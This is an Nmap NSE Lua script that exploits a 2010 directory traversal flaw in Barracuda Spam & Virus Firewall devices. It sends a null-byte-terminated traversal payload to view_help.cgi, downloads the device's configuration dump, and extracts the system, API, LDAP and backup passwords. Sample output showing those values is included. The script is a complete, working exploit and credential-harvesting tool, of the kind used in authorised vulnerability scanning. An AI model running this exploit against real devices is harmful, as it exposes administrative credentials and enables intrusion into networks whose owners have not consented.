local http = require "http"
local shortport = require "shortport"
local stdnse = require "stdnse"
local string = require "string"
local table = require "table"

description = [[
Attempts to retrieve the configuration settings from a Barracuda
Networks Spam & Virus Firewall device using the directory traversal
vulnerability described at
http://seclists.org/fulldisclosure/2010/Oct/119.

This vulnerability is in the "locale" parameter of
"/cgi-mod/view_help.cgi" or "/cgi-bin/view_help.cgi", allowing the
information to be retrieved from a MySQL database dump.  The web
administration interface runs on port 8000 by default.

Barracuda Networks Spam & Virus Firewall <= 4.1.1.021 Remote Configuration Retrieval
Original exploit by ShadowHatesYou <Shadow@SquatThis.net>
For more information, see:
http://seclists.org/fulldisclosure/2010/Oct/119
http://www.exploit-db.com/exploits/15130/
]]

---
-- @usage
-- nmap --script http-barracuda-dir-traversal --script-args http-max-cache-size=5000000 -p <port> <host>
--
-- @args http-max-cache-size
--       Set max cache size. The default value is 100,000.
--       Barracuda config files vary in size mostly due to the number
--       of users. Using a max cache size of 5,000,000 bytes should be
--       enough for config files containing up to 5,000 users.
--
-- @output
-- PORT   STATE SERVICE   REASON
-- 8000/tcp open  http    syn-ack Barracuda Spam firewall http config
-- | http-barracuda-dir-traversal:
-- | Users: 256
-- | Device: Barracuda Spam Firewall
-- | Version: 4.1.0.0
-- | Hostname: barracuda
-- | Domain: example.com
-- | Timezone: America/Chicago
-- | Language: en_US
-- | Password: 123456
-- | API Password: 123456
-- | MTA SASL LDAP Password: 123456
-- | Gateway: 192.168.1.1
-- | Primary DNS: 192.168.1.2
-- | Secondary DNS: 192.168.1.3
-- | DNS Cache: No
-- | Backup Server: ftp.example.com
-- | Backup Port: 21
-- | Backup Type: ftp
-- | Backup Username: user
-- | Backup Password: 123456
-- | NTP Enabled: Yes
-- | NTP Server: update01.barracudanetworks.com
-- | SSH Enabled: Yes
-- | BRTS Enabled: No
-- | BRTS Server: fp.bl.barracudanetworks.com
-- | HTTP Port: 8000
-- | HTTP Disabled: No
-- | HTTPS Port: 443
-- | HTTPS Only: No
-- |
-- | Vulnerable to directory traversal vulnerability:
-- |_http://seclists.org/fulldisclosure/2010/Oct/119
--
-- @changelog
-- 2011-06-08 - created by Brendan Coles - itsecuritysolutions.org
-- 2011-06-10 - added user count
--            - looped path detection
-- 2011-06-15 - looped system info extraction
--            - changed service portrule to "barracuda"
--

author = "Brendan Coles"
license = "Same as Nmap--See https://nmap.org/book/man-legal.html"
categories = {"intrusive", "exploit", "auth"}


portrule = shortport.port_or_service (8000, "barracuda", {"tcp"})

action = function(host, port)

  local result = {}
  local paths = {"/cgi-bin/view_help.cgi", "/cgi-mod/view_help.cgi"}
  local payload = "?locale=/../../../../../../../mail/snapshot/config.snapshot%00"
  local user_count = 0
  local config_file = ""

  -- Loop through vulnerable files
  stdnse.debug1("Connecting to %s:%s", host.targetname or host.ip, port.number)
  for _, path in ipairs(paths) do

    -- Retrieve file
    local data = http.get(host, port, tostring(path))
    if data and data.status then

      -- Check if file exists
      stdnse.debug1("HTTP %s: %s", data.status, tostring(path))
      if tostring(data.status):match("200") then

        -- Attempt config file retrieval with LFI exploit
        stdnse.debug1("Exploiting: %s", tostring(path .. payload))
        data = http.get(host, port, tostring(path .. payload))
        if data and data.status and tostring(data.status):match("200") and data.body and data.body ~= "" then

          -- Check if the HTTP response contains a valid config file in MySQL database dump format
          if string.match(data.body, "DROP TABLE IF EXISTS config;") and string.match(data.body, "barracuda%.css") then
            config_file = data.body
            break
          end

        else
          stdnse.debug1("Failed to retrieve file: %s", tostring(path .. payload))
        end

      end

    else
      stdnse.debug1("Failed to retrieve file: %s", tostring(path))
    end

  end

  -- No config file found
  if config_file == "" then
    stdnse.debug1("%s:%s is not vulnerable or connection timed out.", host.targetname or host.ip, port.number)
    return
  end

  -- Extract system info from config file in MySQL dump format
  stdnse.debug1("Exploit success! Extracting system info from MySQL database dump")

  -- Count users
  if string.match(config_file, "'user_default_email_address',") then
    for _ in string.gmatch(config_file, "'user_default_email_address',") do user_count = user_count + 1 end
  end
  table.insert(result, string.format("Users: %s", user_count))

  -- Extract system info
  local vars = {
    {"Device", "branding_device_name"},
    {"Version","httpd_last_release_notes_version_read"},
    {"Hostname","system_default_hostname"},
    {"Domain","system_default_domain"},
    {"Timezone","system_timezone"},
    {"Language","default_ndr_lang"},
    {"Password","system_password"},
    {"API Password","api_password"},
    {"MTA SASL LDAP Password","mta_sasl_ldap_advanced_password"},
    {"Gateway","system_gateway"},
    {"Primary DNS","system_primary_dns_server"},
    {"Secondary DNS","system_secondary_dns_server"},
    {"DNS Cache","dns_cache"},
    {"Backup Server","backup_server"},
    {"Backup Port","backup_port"},
    {"Backup Type","backup_type"},
    {"Backup Username","backup_username"},
    {"Backup Password","backup_password"},
    {"NTP Enabled","system_ntp"},
    {"NTP Server","system_ntp_server"},
    {"SSH Enabled","system_ssh_enable"},
    {"BRTS Enabled","brts_enable"},
    {"BRTS Server","brts_lookup_domain"},
    {"HTTP Port","http_port"},
    {"HTTP Disabled","http_shutoff"},
    {"HTTPS Port","https_port"},
    {"HTTPS Only","https_only"},
  }
  for _, var in ipairs(vars) do
    local var_match = string.match(config_file, string.format("'%s','([^']+)','global',", var[2]))
    if var_match then table.insert(result, string.format("%s: %s", var[1], var_match)) end
  end

  table.insert(result, "\nVulnerable to directory traversal vulnerability:\nhttp://seclists.org/fulldisclosure/2010/Oct/119")

  -- Return results
  return stdnse.format_output(true, result)

end
